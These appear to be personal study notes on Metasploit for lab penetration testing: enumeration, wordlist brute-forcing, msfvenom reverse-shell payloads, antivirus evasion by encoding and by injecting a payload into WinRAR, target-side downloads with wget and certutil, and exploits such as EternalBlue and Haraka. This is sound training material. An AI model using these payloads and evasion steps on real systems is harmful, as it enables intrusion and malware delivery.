MSF framwork
- Robust framework for pentesters
- Automate every stage of a pen attack
- Use to create and test exploits (thus leading to a large database of publicly available exploits for use)
- New functionality is added using "modules"

There are paid versions of msf
MSF Pro/Express --> for commercial use
MSF Framework --> free, used by us

Interfacce:
- msfconsole
- MSFcli --> facilitate the creation of automation scripts that use msf modules
	-Discontinued but can still be used in the msfconsole
- MS Community edition --> web base GUI for network discovery and vuln identifying
- Armitage --> GUI for the msfconsole (same functionality but w visualisation)


## MSF Architecture

MSF Modules
Exploit -> mode to lev a vuln
Payload -> Malicious code send tru the exploit (usually a reverse shell)
Encoder ->encode payloads to prevent AV detection (eg shikata_ga_nai used for windows)
NOPS --> Ensure stability of payload when executed
Auxiliary --> Additn functions like portscanning/enumeration
![[Screenshot 2023-03-04 150008.png]]

### Payload types
Non staged
- Sent to target as is with the exploit


Staged
- Sent in 2 parts:
	1. Stager(pt1) contains a payload to establish reverse connection, download stage(pt2) and execute it
	2. Stage contains malicious code (RCE/ReverseShell/Meterpreter session)
Note: Stager is used to establish a stable connection and download the stage

### Meterpreter payload
- Advanced multi-functionla payload executed in memory making it hard to detect
- Communicates over a stager socket

### Directory
In built modules:
usr/share/metasploit-framework/modules

Own metasploit modules:
/home/kali/.msf4/modules


### Pentesting
Pentest phases
1. Information gathering
2. Enumeration
3. Exploitation
4. Post exploitation
	1. Priv Esc
	2. Maintain Persistent Access
	3. Clearing Tracks

Msf Modules for the phases
1. Auxiliary --> info gathering/Enum
2. Auxiliary/Nessus --> Vulnerbility scanner
3. Exploit Modules/Payload --> Exploitation
4. Meterpreter --> Post Exploit
5. Post exploit modules/Meterpreter --> priv esc
6.  Post exploit modules/Persistence --> Maintain persistent access

Setting up MSF....
MSF db uses PostgreSQL --> must be used for full funcitonality (ie importing scan results, exploitaiton that uses saved creds etc)

`sudo apt-get update && sudo apt-get install metasploit-framework -y`

initial setup the db
`sudo systemctl enable postgresql`
`sudo systemctl start postgresql`
`sudo systemctl status postgresql`

`sudo msfdb init`
or `sudo msfdb reinit` --> if thrs problems
`sudo msfdb status`

To start the postgresql db
`service postgresql start`
`/etc/init.d/postgresql start`

`msfconsole`  :)
```msfconsole
db_
db_status
```

### Using msfconsole
new notes:
`search cve:2009 type:exploit platform:windows` 
--> can search a cve directly and give a type of module + platform

works just like nc -lvnp 80
`connect -h`
`connect 192.168.2.3 80` 

### MSF workspaces
datastored for different pentesting engagements
- the database makes sure data is not lost between startups
- But data shud not be shared between 2 diff projects --> Thus workspaces exist to seperate

`db satus`
`workspace` --> workspace being used
`hosts` --> lists out details of all hosts prev found in engagement

`workspace -a test`
`workspace -d test`
--> adds/deletes a new workspace 'test'
then check current workspace using `workspace`, shud be in test
`hosts` --> no longer shows prev data

`workspace default`
--> shifts back to default workspace with all the prev data

## Nmap with MSFconsole

- Output scan for MSFdb (into xml format)
-oX `output file name`
Eg `nmap -Pn -sV -O 10.4.22.173 -oX windows_server_2012.xml`

- Import nmap scan data
In MSFconsole 
`workspace -a win2k12`
`db_import /windows_server_2012.xml`

- MSFconsole can also do a nmap scan
`db_nmap -Pn -sV -O 10.4.22.173`  

Useful xtra functions:
`hosts` --> to double check the scan for the host was added
`services`  --> shows the services prev scanned
`vulns` --> lists out available vulns ???


## MSF enumeration

Portscanning with auxiliary enumeration
- use to extract info from target
- Services to enumerate: FTP, SMB, SSH, HTTP
- Most useful for post exploit, after initial access (ie u cant/shud not import nmap onto the target)

### Portscanning
- Search for appropriate scanner `search portscan`
- set options
- run (open ports show up )
- `curl <target ip>` dwnlds the webapp display if you dont have access to the browser and port 80 is open

ontarget session
- shell
- `/bin/bash -i`  open a bash terminal to make it easier to type cmds
- `ifconfig` --> find an interface under a diff subnet from the one u accessed the targt from
- From thr just pingsweep the new subnet (or assume its on .3 instead of .2 etc)

Route the new subnet
- go back to meterpreter
`run autoroute -s 192.113.124.2 ` 
--> just add a ip addr from the subnet (dont need the actual ip of the new target or the subnet range)

Portscan the new ip using the portscan/tcp module or /udp also works

### FTP enumeration
auxiliary module used
/ftp/ftp_version
/ftp/anonymous

/ftp/ftp_login
--> set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
--> set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

from the msfconsole connect directly to ftp
`ftp <target ip>  `
--> enter username/pword

### SMB enum
- shared central storage allowing read and write directly on the server
(unlike FTP where you r only allowed to make a copy from the server, but FTP is faster at sending out files)

auxiliary module used
/smb/smb_version
/smb/smb_enumusers

/smb/smb_enumshares
`set ShowFiles true` 
->shows shares for the specific users (might not be same as users)

/smb/smb_login
`set SMBUser admin` (Or watever is needed)
`set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`

List out shares
`smbclient -L \\\\192.91.46.3\\ -U admin`

Login
`smbclient \\\\192.91.46.3\\<sharename> -U admin`


### Web server enum
- web server utilises HTTP (80) HTTPS(430)

auxiliary module used
/http/http_version
--> if SSL used (ie HTTPS) set SSL true

/http/http_header
--> can either use HEAD or GET
--> ign_header is a list of headers to ignore
- The Content-Type gives clue on the language used on the server

/http/robots_txt
--> scan for the robots.txt (file that exclude certain directories from being crawled)
--> curl the directories excluded found in robots.txt exists for more info
`curl http://<ip>/<dir found>/`
eg: Disallow: /data or /secure etc

Directory listing found (/data)
- Native to apache and some web servers
- Allows to store files in some dirs

Secure dir found (/data)
- Needs auth/ can try bruteforcing creds

/http/dir_scanner
--> dirb basically

/http/files_dir
--> bruteforce to find files HTTP file scanner
--> can change the dict to anyt u want from /usr/share/wordlists

/http/http_login
--> auth bf for http
`set AUTH_URI /<watever dir needs auth>/
`unset USERPASS_FILE` --> in this case, the user file and pass file alrdy set, so dont need userpass
Try other wordlists
`set USER_FILE /usr/share/metasploit-framework/data/wordlists/namelist.txt`
`set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`

/http/apache_userdir_enum
--> identifies valid users on the server based on the error code returned
--> use this to find valid users then bf with a pw wordlist
`set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt`
Note: In the example user `rooty` was found
- Use that username for the http_login module 

### MySQL Enum
- Used to store data -p3306 (port can be anyt)
- commonly deployed for web app data

auxiliary module used
search type:auxiliary name:mysql

/scanner/portscan/tcp  --> find the port mysql is hosted on

/mysql/mysql_version

/mysql/mysql_login
`set USERNAME root`
`set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`

/admin/mysql/mysql_enum
--> credentials required to use mods in admin subdir
`set <username/password options>`

/admin/mysql/mysql_sql
--> interact with the db using commands
Eg `set SQL show databases;`

/mysql/mysql_schemadump

Useful commands in msfconsole:
`loot` to see info u found
`creds` dumps out all the creds found
`services` dumps out services scanned
--> creating a workspace for every assesment makes this convenient

#### Enum MySQL normally
`mysql -h 192.146.6.3 -u root -p` --> Enter the password when prompted after
`show databases`
`use <database>`
`show tables` etc etc

### SSH Enum
-p22
- for remote access with a GUI use RDP or VNC etc instead
- adv over telnet is encryption (Prevent MIMs)

auxiliary modules used
Note: `setg RHOST` and `setg RHOSTS` -->mods could use either

`search type:auxiliary name:ssh`

/ssh/ssh_version

/ssh/ssh_login
--> if target is not config to use public key encryt else use below mod instead
--> session starts up auto
`set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt`
`set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`

/ssh/ssh_login_pubkey

/ssh/ssh_enumusers
--> narrow down the bruteforce 

### SMTP Enum
- simple mail transfer protocol
- for email transmission
-p25 defualt
-p465/587 with encrytion (SSL or TLS cert is set up)

auxiliary modules used
`search type:auxiliary name:smtp`

/smtp/smtp_version
--> gives the version (eg ESMTP Postfix)
--> also gives email domain format for this server (eg openmailbox.xyz)

/smtp/smtp_enum
`set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt`




## Vulnerability Scanning
- Scan for vulnerabilitys and see if it can exploited
- Find msf modules to exploit

Lab demo:
- Using Metasploitable3 a vuln virtual machine

find the target on the network
`sudo nmap -sn 10.10.10.1/24` 

In msfconsole
`workspace -a <name this>`
`db_nmap -sS -sV -O 10.10.10.4`

--> lots of services apear
--> the smb port give an idea of the OS running

Find exploits
--> go tru the services and
`search type:exploit name:<servicename>`
- If no exploits found means 
	1. There are no epxloits or
	2. No MSF exploits exist for it (eternal/manual exploit needed)
- If exploit is found
	-> `use` and `info` the mod to see if can

--> rmb to set payload to correct OS
`set payload windows/meterpreter/reverse_tcp`

`services` --> check the port to use for exploit found from scan

Find exploits using `searchsploit`
-> Finds vulns from ExploitDB
-> Find MSF exploit modules for them
`searchsploit "Microsoft Windows SMB" | grep -e "metasploit"` 

#### Metasploit-autopwn
- works with the database (Must start postgre) to find vulns
- clone the rept and move it to the msf plugins dir
`wget https://raw.githubusercontent.com/hahwul/metasploit-autopwn/master/db_autopwn.rb`
`cp db_autopwn.rb /usr/share/metasploit-framework/plugins'

In msfconsole
`load db_autopwn` --> load the plugin
`db_autopwn`

`db_autopwn -p -t -PI 21` etc

#### Analyse command
- uses the scan info in the database to find vulns
- set the target then
`analyse`
--> the vulns get listed out

`vulns` --> should now show the vulnerabilities found for that target


## Nessus vuln scanning
- Import results into msf the result to analyse and exploit
- Process:
	1. Host scanning (ping sweep)
	2. Port scanning
	3. Grab all banners/service info
	4. Checks its database for vulns
Lab Demo:
Using nessus essentials (free version of nessus) on the metasploitable3 VM
- Nessus is donwloaded and installed (used debian package manager dpkg)
`sudo dpkg -i Nessus-10.0.0-debian6_amd64.deb`
- startup
go tru everything and its a web GUI 

Enter target ip etc click here click there
Do the fulll scan
At the scan results, Export. Nessus.

On the msfconsole
`workspace -a MSF3Results`
`db_import`  --> gives a list of tools that gives reults that can be imported into msf

`db_import /home/kali/Downloads`
Check if its works
`hosts`
`services`
`vulns`

- Limit the output of vulns like so
`vulns -p445` 
-> limits to only smb on port 445

Search for the associated vulns eg:
	Year
	`search cve:2017 name:smb`
	Microsoft vuln
	`search MS12-020` 

## Web App Vuln scanning

### WMAP
- automate webserver enumeration
- scan webapp for vulns (Common vulns)
	- SQLi
	- XSS
	- SSTI 
	- SSRF
- WMAP plugin comes with msf and loaded with msf
- Means all the result stored direct in the msfdb

Lab demo:
`service postgre start`
`msfconsole
`setg RHOSTS < targetip>`
`load wmap`

See available modules
`wmap_`
`wmap_sites -h`

- add the sites
`wmap_sites -a 192.157.89.3`

- Choose the target (in this case just the root)
`wmap_targets -t http://192.157.89.3`

- List out the sites/targets
`wmap_sites -l`
`wmap_targets -l`

- Attack
`wmap_run -h`
`wmap_run -t` --> List msf auxiliary modules to use for scanning the target
Exec
`wmap_run -e`

- See vulns found
`wmap_vulns -l` --> only dirs came out on the demo (not too useful)

--> The scan showed that PUT options seemed to be enabled
`use auxiliary/scanner/http/options`

`use auxiliary/scanner/http/http_put`
- The root directory doesnt allow PUT
- Try the PATH /data/ dir
- And it works!! File upload allowed
- Do:
`set FILEDATA <web payload here>` -->eg a PHP meterpreter
`set FILENAME payload.smt`

The attack:
1. Upload a web shell payload (eg PHP watever is allowed in the dir)
2. Navigate to the directory created on the server
3. Set up reverse listener on the attacker
4. Run a reverse shell on the web server


# Generating a payload
### Client-side attack
- An attack vector involving coercing a client to execute a malicious payload on their system that connect back to the attacker
- Typically done using social engineering techniques like malicious documents or portable executables (eg malware)
- Takes advantage of human vulns instead of system/service vulnerabilities on the target
- Involves transfer and storage of malicious payload that can be detected by AV (antivirus) detection --> Need to encode the payloads/or inject into legitimate exe

Eg: 
#### Host/Service-based attack
The target system is a server (eg WIndows server) to host applications (webserver etc)
- Then the attack vector should be a host/service-based attack
- Attacking the service being run by exploiting service vulns

#### Client-side attack
The target is a end-user OS  ( Employee workstation/laptop etc ) 
- Then Client-side attack is used
- Generate a malicious payload (windows/linux)
- Then utilise social engineering technique to get the client to execute the payload
- A listener on the attacker will receive the connection

## MSFvenom
- combination of 2 tools (MSFpayload + MSFencode)

`msfvenom --list payloads`
--> primary using:
windows/x64/meterpreter/reverse_tcp
linux/x64/meterpreter/reverse_tcp
windows/meterpreter/bind_tcp
`<os>/<system archi>/<staged,nonstaged,type of payload>/<type of connection>`

- Note:
Staged payload:         windows/x64/meterpreter/reverse_tcp
Non-staged payload: windows/x64/reverse_tcp

32bit payloads work on both 64 and 32bit but 64bit only woks on 64bit.

`msfvenom --list formats`
--> types of available payload formats 
-> executable formats (asp elf exe)
-> framework formats (py c powershell hex)

### Generating
windows 32 bit meterpreter reverse tcp
`msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=<attackers ip> LPORT=<anyt> -f exe > payloadx86.exe`

windows 64 bit meterpreter reverse tcp
`msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=<attackers ip> LPORT=<anyt> -f exe > payloadx64.exe`

linux 32 bit meterpreter reverse tcp in linux extensible linking format (elf)
`msfvenom -a x86 -p linux/meterpreter/reverse_tcp LHOST=<attackers ip> LPORT=<anyt> -f elf > payloadx86`

Sending payload to http target
`sudo python -m SimpleHTTPServer 80` -> on attacker with payload
`wget http://<ip>/<payloadName>` or `curl` -> on the target

On target
`chmod +x payloadx86`
`./payloadx86`

On attacker
`use multi/handler`
`set payload windows/meterpreter/reverse_tcp`

## Encoding Payloads with MSFvenom

- AV solutions like windows defender prevent payloads from uploading/executing
- They use signature based detection generally
- Similar to file hashing where each file has a unqiue hash
- AV companies have a large db (makes it difficult to evade new AV solutns)
- This method only works for old AV software

Shellcode
- a piece of code typically used as payload for exploit
- a piece of code that provides attacker a remote cmd shell
- encode this to evade old AVs

demo:
`msfvenom --list encoders`
typically best is (excellent rank):
x86/shikata_ga_nai 
cmd/powershell_base64

Encode once
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attackerip> LPORT=<rand> -e x86/shikata_ga_nai -f exe > encodex86.exe`

Encoded 10 iterations (anymore wont affect much)
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attackerip> LPORT=<rand> -i 10 -e x86/shikata_ga_nai -f exe > encodedx86.exe`

`msfvenom -p linux/meterpreter/reverse_tcp LHOST=<attackerip> LPORT=<rand> -i 10 -e x86/shikata_ga_nai -f elf > encodedx86

### Injecting payloads into Windows Portable Executables
- avoid AV detections
- Put payload into legitimate exe (eg WinRAR)

demo:
- Download WinRAR (for example only)
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attackerip> LPORT=<rand> -i 10 -e x86/shikata_ga_nai -f exe -x ~/Downloads/wrar602.exe > winrar.exe`

if `-k` options is used also, the original functionality of the exe (winrar) can be maintained

`run post/windows/manage/migrate ` 
--> migrate ps to notepad.exe automagically

if not
`ps`
- Choose a process with rights
`migrate <pid>`

## Automating Metasploit with resource scripts
- automate repetitive tasks
- like batch scripts
- scripts
- scripts
- scripts
scripts
scripts
scripts
scripts
scripts
Prepackaged scripts
`ls -al /usr/share/metasploit-framework/scripts/resource/ `

Eg 
Set up multi handler automatically
`nano handler.rc`
```ruby
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOSTS 10.10.10.5
set LPORT 1234
run
```

`msfconsole -r handler.rc`
--> multi handler starts straight up

setup portscan auto
`nano portscan.rc`
```ruby
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.10.3
run
```
`msfconsole -r portscan.rc`

Start resource script from msfconsole
`resource ~/Desktop/windows_payloads/handler.rc`
- just the path where script is

create RC automatically
- Restart msfconsole
- Go through the commands you wnat to add
- `makerc ~/Desktop/test.rc`  --> saves the commands you used (saves it under root user cos the ~ path here is root since msf uses root privs)



# Exploitation
## Windows Exploit

### Vulnerable HTTP file server
- Designed for file and doc sharing
- typically -p80/443 and utilise HTTP
- Rejetto HFS is popular setup for both windows n linux
- Rejetto HFSv2.3 is vuln to RCE
Note: web server (eg Apache, Nignx, MS IIS) can also share files but can also host webapp unlike a file server

Demo:
Fairly simple
Rejetto module in msf used
`set payload windows/x64/meterpreter/reverse_tcp`

Note: 
Payload should be specified but it still works without specifiying as the module uses some default ig

### MS17-1010 SMB vulnerability
- Eternal blue
- Developed by the NSA and leaked
- On all versions after Vista (w10,w7,w server 2008 etc etc)
- Takes adv of SMBv1 allows to send packets to targets
- Often times not patched

Demo:
Check the OS (guess it based on services used or the -O sometimes wrong)
Eg Microsoft winsows 7-10 microsft ds

/smb/smb_ms17_010

/smb/ms17_010_eternalblue
Make sure the os architecture is correct x64 or x86

### WinRM exploit (not a vuln)
- Remote management on windows
- typically -p5985 5986(HTTPS)
- get creds then access

Demo:
Note, must use -p- for scan as this lies outside the 1000common ports (service banner might be wrong)

/winrm/winrm_auth_methods
Auth methods supported here:
- Negotiate protocol
- basic protocol
-> can bf the pw

/winrm/winrm_login
`uri /wsman`
`set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt`
`set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`

/winrm/iwnrm_cmd
set creds
`set CMD whoami`

/winrm/winrm_script_exec
set creds
`set FORCE_VBS true` 
--> use visual basic script stager instead of powershell command stager

x64 sessions is received as session is migrated to svchost.exe which is a 64 bit process with `NT Authority\system`

### Apache Tomcat webserver
- Utilises HTTP protocol to facilitate communication betwn server and clients
- Port 8080 by default
webserver Apache vs Apache tomcat
- Apache Tomcat used to host for webapps developed in Java (dynamic)
- standard Apache HTTP web server used to host HTML or PHP web application (static)

Hence dynamic nature allowed remote code execution

Demo:
/http/tomcat_jsp_upload_bypass
- downloads a jsp file (java service file) so a java payload is required
`set payload java/jsp_shell_bind_tcp`
`set SHELL cmd`
-> Need to set the shell for the payload (windows in this case. Bash if linux maybe)
Note: Rhosts and Rhost on the payload needs to be the same for bind shell. !!!!

Exploit might take a few tries.  -> use `check` to make sure it shud actly work

ctrl+z t background the task
- Since the session created is a java shell (upgrading to meterpreter directly will not work)

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=1234 -f exe > meterpreter.exe`
`sudo python -m SimpleHTTPServer 80`

On the target session
`certutil -urlcache -f http://<attackerip>/meterpreter.exe meterpreter.exe`
-> inbuilt windows utility

setup a handler
`nano handler.rc`
```bash
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <ip>
set port 1234
run
```
`msfconsole -r handler.rc`

On compromised session
`.\meterpreter.exe`


## Linux exploitation

### FTP vuln exploit
- File transer protocol
- To transfer website files to and from a webserver
- Provide access to the dir where web dir is hosted

- vsftp v2.3.4 vuln to CMD exec vuln 
- Facilitated by a malicious backdoor that was added to vsftp download archive through supply chain attack which was removed in later versions

Demo:
After the db_nmap scan 
`analyse` -> see if any vulns can be found automagic
If not, just search the versions

/ftp/vsftp_234_backdoor

/post/multi/manage/shell_to_meterpreter
`set LHOST eth1`
`set sessions 1`

Error might appear but the session should be created
`sessions 2`

### Samba vuln exploit
- SMB but for linux

- Samba V3.5.0 vuln to RCE
- allows malicious client to upload a shared lib to a writable share
- Cause server to load and exe it
- Similar to the eternal blue exploit

Demo:
/samba/is_known_pipename
`check`

/post/multi/manage/shell_to_meterpreter
`set LHOST eth1`
`set sessions 1`

### SSH Server vuln exploit
- SSH secure shell
- p22 default

- libssh is a multiplatform C lib implementing SSHv2 on lcient and server side
- libssh v0.6.0-v0.8.0 is vulnerable to auth bypass vulnerability in the libssh server code that can be exploited to execute commands on the target server

Demo:
/ssh/libssh_auth_bypass
`set SPAWN_PTY true` --> spawn a terminal session set it to true
`sessions 1`

/post/multi/manage/shell_to_meterpreter
`set LHOST eth1`
`set sessions 1`

### SMTP Server vuln exploit
- Transmission of email
- p25

- Haraka opensource high perf SMTP server developed in Node.js
- Haraka SMTP server comes with a plugin for processing attachments 
- versions prior to V2.8.9 are vuln ot CMD injection
Cool: haraka is kiswahili for fast

Demo:
/smtp/haraka
- A valid email address must be provided that the server accepts
where to launch mail server locally (the attackers machine)
`set SRVHOST 0.0.0.0`
`set SRVPORT 9898`  --> must be different from the LPORT option (which will need it for the connection)

`set email_to root@attackdefense.test`
`set payload linux/x64/meterpreter_reverse_http`  --> non-staged payload used instead
`set LHOST eth1`


## Post Exploit Fundamntals

Various techniques used here:
Eg
- Local Enumeration
- Priv Escalation
- Dumping hashes
- Establish persistence
- Clearing tracks
- Pivoting


### Meterpreter sessions/shell
- Meta-interpreter is a multi-funcitonal payload executed on memory (difficult detect)
- Communicates over a staged socket, provides command tinterpreter ontarget
- facilitates execution of system cmds, file system navigation, keylogging etc
- load custom scripts and plugins dynamically
- diff payloads for diff envs available

Demo:
Only terminal given, no desktop env available
scan and curl the site

- Found XODA is used
/webapp/xoda_file_upload

Common commands to run:
`sysinfo`
`getuid`
`help`

`bg`  -> ctrl Z also bgs the session

`sesisons -h`
`sessions -C sysinfo -i 1`
--> runs a command on the given session
`sessions -n xoda`
--> name the session xoda etc
`sessions -k`
->kill

In the session
`edit flag1`
-> opens vim to edit the file in the session

`download flag5.zip <dir to dl to, optional>`

On Msfconsole
`unzip flag5.zip`
`cat list`
-> flag "list" found in zip says to look at the MD5 hash of /bin/bash

so, go back to the session
`checksum md5 /bin/bash`
-> the hash given is the flag

More commands:
`getenv PATH`
-> gives back the env var PATH

`search -d /usr/bin -f *backdoor*` 
`search -f *.jpg`
`search -f *.php`

`shell`
-> opens up the native shell (cmd for windows, terminal for linux)
In the shell `/bin/bash -i` 

`ps`
`migrate 580`
`migrate -N apache2`
-> list out the process can migrate to depending on priveledges

`execute -f ifconfig`

### Upgrading cmd shell to meterpreter shell

demo:
/samba/is_known_pipename

/post/multi/manage/shell_to_meterpreter
`set LHOST eth1`
`set sessions 1`

Another way
`sessions -u 1`
-> works on quite a few platforms automated ver of the prev method

